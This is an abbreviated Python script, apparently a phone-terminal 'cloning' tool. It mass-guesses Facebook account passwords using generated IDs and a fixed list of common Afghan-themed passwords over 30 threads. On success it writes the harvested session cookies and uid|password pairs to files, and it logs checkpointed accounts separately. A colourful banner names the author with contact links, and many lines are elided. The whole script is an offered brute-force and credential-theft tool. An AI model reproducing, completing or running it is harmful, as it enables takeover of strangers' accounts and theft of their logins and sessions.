...
from bs4 import BeautifulSoup as sop	
print('[•] Followe My Facebook ID')
os.system('xdg-open https://www.facebook.com/hks.power1/')
...
=======================================================
\033[1;31m====================================================
\033[1;33m¶ ❯❯❯\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{ HIMTO }\33[0;m      
\033[1;33m¶ ❯❯❯\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{Hks Poewr }\33[0;m        
\033[1;33m¶ ❯❯❯\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{AfghanHimatKhan12}\33[0;m              
\033[1;33m¶ ❯❯❯\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{ NO YOUTUBE CHINAL }\33[0;m      
\033[1;33m¶ ❯❯❯\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+93774657250 }\33[0;m
...
\033[1;33m¶ ❯❯❯\033[1;37m \033[1;32mVERSION   \033[1;31m ┇\033[31;47m{0.1}\33[0;m                 
\033[1;31m====================================================
\33[37;41m\t WELLCOME TO HIMAO TOOLS : THANKS FOR HELP OF FRIENDS\33[0;m
...
def FKING():
		...
		#	linex()
			...
			if jf in ['1','01']:
			 ...
			 os.system('xdg-open https://chat.whatsapp.com/CuMRxILjyccLPFKGmPRzGm')
			elif jf in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def AFG():
		...
		try:
			limit = int(input('\033[1;35m example: 1000, 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;32m \n [1] \033[1;33mMethod ')
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000','123@@##','Afghan@#123']
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [HIMAT✓STAR]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/A-A.N-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/A-A.N-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [A.N™✓CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/A.N-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
